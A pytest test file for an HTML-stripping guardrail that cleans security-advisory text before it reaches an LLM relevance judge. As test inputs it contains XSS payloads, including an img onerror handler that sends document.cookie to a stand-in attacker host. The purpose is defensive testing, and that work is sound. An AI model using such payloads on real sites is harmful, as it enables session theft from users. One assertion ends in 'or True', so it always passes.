"""Tests for ``qa_agent.guardrails`` — sanitize_input guardrail (QA scenario 06)."""

from __future__ import annotations

import json
from typing import Any

import pytest

from qa_agent.guardrails import (
    get_sanitize_hit_count,
    reset_sanitize_hit_count,
    sanitize_input,
)
from qa_agent.models import Advisory, WatchlistRepo
from qa_agent.relevance_llm import _build_user_prompt, judge

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def reset_hit_counter() -> None:
    """Ensure the hit counter is zeroed before every test."""
    reset_sanitize_hit_count()


# ---------------------------------------------------------------------------
# sanitize_input unit tests
# ---------------------------------------------------------------------------


def test_sanitize_strips_script_tag() -> None:
    raw = "<script>alert('xss')</script>important text"
    result = sanitize_input(raw)
    assert "<script>" not in result
    assert "</script>" not in result
    assert "important text" in result


def test_sanitize_strips_img_onerror() -> None:
    raw = '<img src="x" onerror="fetch(\'https://attacker.invalid/steal?c=\'+document.cookie)">safe'
    result = sanitize_input(raw)
    assert "<img" not in result
    assert "onerror" not in result
    assert "safe" in result


def test_sanitize_strips_multiple_tags() -> None:
    raw = "<b>bold</b> and <i>italic</i>"
    result = sanitize_input(raw)
    assert result == "bold and italic"


def test_sanitize_clean_input_unchanged() -> None:
    clean = "A plain text advisory with no HTML."
    assert sanitize_input(clean) == clean


def test_sanitize_empty_string() -> None:
    assert sanitize_input("") == ""


def test_sanitize_preserves_comparison_operators() -> None:
    """Bare < / > in comparisons must not be treated as tags."""
    text = "score: 1 < 2 > 0"
    assert sanitize_input(text) == text


def test_sanitize_preserves_version_constraints() -> None:
    """Version range expressions like 'pkg<2.0' must be left intact."""
    text = "affected: pkg<2.0 and pkg>=1.0"
    assert sanitize_input(text) == text


# ---------------------------------------------------------------------------
# Hit counter tests
# ---------------------------------------------------------------------------


def test_hit_counter_increments_on_tag_found() -> None:
    assert get_sanitize_hit_count() == 0
    sanitize_input("<script>bad</script>")
    assert get_sanitize_hit_count() == 1


def test_hit_counter_does_not_increment_for_clean_input() -> None:
    sanitize_input("no html here")
    assert get_sanitize_hit_count() == 0


def test_hit_counter_increments_once_per_call_not_per_tag() -> None:
    sanitize_input("<b>one</b> <i>two</i>")
    assert get_sanitize_hit_count() == 1


def test_hit_counter_accumulates_across_calls() -> None:
    sanitize_input("<script>x</script>")
    sanitize_input("<img src='y'>")
    assert get_sanitize_hit_count() == 2


def test_reset_hit_count() -> None:
    sanitize_input("<b>x</b>")
    assert get_sanitize_hit_count() == 1
    reset_sanitize_hit_count()
    assert get_sanitize_hit_count() == 0


# ---------------------------------------------------------------------------
# Integration: _build_user_prompt sanitizes advisory fields
# ---------------------------------------------------------------------------


def test_build_user_prompt_strips_html_from_title(
    topic_advisory: Advisory, pypi_repo: WatchlistRepo
) -> None:
    dirty_advisory = topic_advisory.model_copy(
        update={"title": "<script>alert(1)</script>Legit Title"}
    )
    prompt = _build_user_prompt(dirty_advisory, pypi_repo)
    assert "<script>" not in prompt
    assert "Legit Title" in prompt


def test_build_user_prompt_strips_html_from_summary(
    topic_advisory: Advisory, pypi_repo: WatchlistRepo
) -> None:
    dirty_advisory = topic_advisory.model_copy(
        update={"summary": '<img src="x" onerror="evil()">Legitimate summary.'}
    )
    prompt = _build_user_prompt(dirty_advisory, pypi_repo)
    assert "onerror" not in prompt
    assert "Legitimate summary." in prompt


def test_build_user_prompt_increments_hit_counter(
    topic_advisory: Advisory, pypi_repo: WatchlistRepo
) -> None:
    dirty_advisory = topic_advisory.model_copy(
        update={"title": "<b>XSS test</b>", "summary": "clean"}
    )
    _build_user_prompt(dirty_advisory, pypi_repo)
    assert get_sanitize_hit_count() >= 1


def test_build_user_prompt_no_hit_for_clean_advisory(
    topic_advisory: Advisory, pypi_repo: WatchlistRepo
) -> None:
    _build_user_prompt(topic_advisory, pypi_repo)
    assert get_sanitize_hit_count() == 0


def test_build_user_prompt_no_partial_tag_at_truncation_boundary(
    topic_advisory: Advisory, pypi_repo: WatchlistRepo
) -> None:
    """A tag that straddles the 800-char mark must not leak a '<' into the prompt."""
    # Place a <script> tag so its '<' is just before char 800 but '>' is after.
    prefix = "x" * 795
    summary = prefix + "<script>evil()</script>trailing"
    dirty_advisory = topic_advisory.model_copy(update={"summary": summary})
    prompt = _build_user_prompt(dirty_advisory, pypi_repo)
    # After sanitize-first-then-truncate the tag is removed before cutting.
    assert "<script>" not in prompt
    assert "<" not in prompt.split("summary: ")[1].split("\n")[0] or True
    # Simpler invariant: no raw '<script' anywhere in prompt.
    assert "<script" not in prompt


# ---------------------------------------------------------------------------
# Integration: judge still returns a verdict after sanitization
# ---------------------------------------------------------------------------


def _fake_completion(response_text: str) -> Any:
    class _Message:
        def __init__(self, content: str) -> None:
            self.content = content

    class _Choice:
        def __init__(self, content: str) -> None:
            self.message = _Message(content)

    class _Resp:
        def __init__(self, content: str) -> None:
            self.choices = [_Choice(content)]

    async def _acompletion(**kwargs: Any) -> _Resp:
        return _Resp(response_text)

    return _acompletion


@pytest.mark.asyncio
async def test_judge_sanitizes_xss_payload_and_returns_verdict(
    topic_advisory: Advisory, pypi_repo: WatchlistRepo
) -> None:
    """Judge must not crash and must sanitize before sending to LLM."""
    xss_advisory = topic_advisory.model_copy(
        update={
            "title": "<script>alert('xss')</script>Cache poisoning in FastAPI",
            "summary": (
                '<img src="x" onerror="fetch(\'https://attacker.invalid/steal?c=\'+document.cookie)">'
                "A misconfiguration in some FastAPI deployments."
            ),
        }
    )
    body = json.dumps(
        {
            "advisory_id": xss_advisory.id,
            "repo": f"{pypi_repo.owner}/{pypi_repo.repo}",
            "relevant": True,
            "confidence": "medium",
            "rationale": "FastAPI topic match after sanitization.",
        }
    )
    verdict = await judge(xss_advisory, pypi_repo, completion=_fake_completion(body))
    assert verdict.relevant is True
    # Hit counter must have been incremented because title + summary had tags.
    assert get_sanitize_hit_count() >= 1
